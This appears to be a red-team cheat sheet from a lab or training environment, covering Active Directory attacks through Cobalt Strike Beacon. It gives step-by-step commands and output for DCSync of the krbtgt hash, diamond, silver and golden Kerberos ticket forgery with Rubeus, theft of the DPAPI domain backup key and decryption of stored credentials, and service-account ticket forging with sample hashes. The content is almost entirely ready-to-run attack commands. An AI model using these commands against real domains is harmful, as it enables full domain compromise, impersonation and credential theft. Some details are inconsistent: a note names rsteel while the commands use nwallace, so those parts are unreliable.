    
##### DCSync

Obtain krbtgt hash and machine account hash
```powershell
dcsync dublin.contoso.com DUBLIN\krbtgt

dcsync contoso.com CONTOSO\lon-db-1$

512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f
cce3f72b3b4bcffe0af7979588b885b6
```

---
##### Diamond Ticket

> **From the medium-integrity Beacon**:

Use AES256 hash of the `krbtgt` account to create a diamond ticket
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56 /ticketuser:nwallace /ticketuserid:4102 /domain:DUBLIN.CONTOSO.COM /nowrap
```

> **From the high-integrity Beacon**:

 Create a new sacrificial logon session for the impersonated user
 ```powershell
make_token CONTOSO\Administrator FakePass
```

Inject Diamond Ticket into logon session and verify
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

run klist
run klist purge
```

---

##### DPAPI Backup Key Abuse

> From the medium-integrity Beacon

Within a Domain Admin session Recover the domain's backup DPAPI key.
```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey

```

Drop the impersonation and use the key to decrypt credentials stored in the Credential Manager
```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:
```

---
##### Silver Ticket

> This can be done locally offline on your machine

Use AES256 machine hash to forge silver ticket (any service can be used)
```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:[HASH] /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

> **From the high-integrity Beacon**:

 Create a new sacrificial logon session for the impersonated user
 ```powershell
make_token CONTOSO\Administrator FakePass
```

Inject Silver Ticket into logon session and verify
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

run klist
run klist purge
```

### USING SERVICE ACCOUNT

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:MSSQLSvc /domain:dublin.contoso.com /password:Passw0rd!

[*] Action: Calculate Password Hash(es)

[*] Input password             : Passw0rd!
[*] Input username             : mssql_svc
[*] Input domain               : CONTOSO.COM
[*] Salt                       : CONTOSO.COMmssql_svc
[*]       rc4_hmac             : FC525C9683E8FE067095BA2DDC971889
[*]       aes128_cts_hmac_sha1 : 53B5F3804FBF13E7DD624E71D18DF9BB
[*]       aes256_cts_hmac_sha1 : E4A51DAD46B6D1BA85627EEC82991C8FC94C279CE06140751E02BA015E6A21F9
[*]       des_cbc_md5          : DF91ECCDAE70BA0E
```

Then forge the service ticket for MSSQLSvc/dub-sql-2.dublin.contoso.com.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/dub-sql-2.dublin.contoso.com /rc4:FC525C9683E8FE067095BA2DDC971889 /user:nwallace /id:4102 /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-2958544638-1589230383-838459903 /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/dub-sql-2.dublin.contoso.com /rc4:FC525C9683E8FE067095BA2DDC971889 /user:nwallace /ldap /domain:dublin.contoso.com /sid:S-1-5-21-2958544638-1589230383-838459903 /nowrap

```

Where:

- `/id` is the RID for rsteel.
    
- `/groups` are the RIDs of rsteel's group membership.  513 is 'Domain Users', 1106 is 'Workstation Admins', 1107 is 'Server Admins', and 4602 is 'Database Admins'.

```powershell
make_token DUBLIN\nwallace FakePass

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

run klist

execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:lon-db-1.contoso.com /m:info

```


---
##### Golden Ticket

> This can be done locally offline on your machine

Use AES256 hash of the `krbtgt` account to forge a golden ticket as the default DA
```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

> **From the high-integrity Beacon**:

 Create a new sacrificial logon session for the impersonated user
 ```powershell
make_token CONTOSO\Administrator FakePass
```

Inject GOlden Ticket into logon session and verify
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

run klist
run klist purge
```